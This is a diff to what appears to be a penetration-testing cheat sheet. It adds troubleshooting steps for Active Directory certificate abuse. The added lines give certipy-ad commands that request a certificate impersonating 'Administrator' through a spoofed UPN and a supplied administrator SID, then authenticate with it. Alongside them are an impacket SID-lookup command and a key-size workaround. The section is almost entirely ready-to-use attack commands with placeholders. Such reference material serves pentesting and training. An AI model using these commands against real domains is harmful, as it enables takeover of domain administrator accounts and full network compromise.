@@ -5022,6 +5022,30 @@ certipy-ad account -u '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -dc-ip '<RHOST>' -u
 certipy-ad auth -pfx 'Administrator.pfx' -username '<USERNAME>' -domain '<DOMAIN>' -dc-ip '<RHOST>'
 ```
 
+##### Error Handling
+
+###### Fixing Username or domain is not specified, and identity information was not found in the certificate Error
+
+```console
+certipy-ad auth -pfx 'Administrator.pfx' -username 'Administrator' -domain '<DOMAIN>' -dc-ip '<RHOST>'
+```
+
+###### Fixing Object SID mismatch between certificate and user 'Administrator' Error
+
+```console
+impacket-lookupsid <DOMAIN>/<USERNAME>:<PASSWORD>@<RHOST>
+```
+
+```console
+certipy-ad req -u '<USERNAME>@<DOMAIN>' -p <PASSWORD> -ca '<CA>' -template '<TEMPLATE>' -upn 'Administrator@<DOMAIN>' -sid 'S-1-5-21-2983547755-698260136-4283918172-500'
+```
+
+###### Fixing Got error while requesting certificate: code: 0x80094811 - CERTSRV_E_KEY_LENGTH - The public key does not meet the minimum size required by the specified certificate template Error
+
+```console
+certipy-ad req -u '<USERNAME>@<DOMAIN>' -p <PASSWORD> -ca '<CA>' -template '<TEMPLATE>' -upn 'Administrator@<DOMAIN>' -key-size '4096'
+```
+
 #### ADCSTemplate
 
 ```cmd
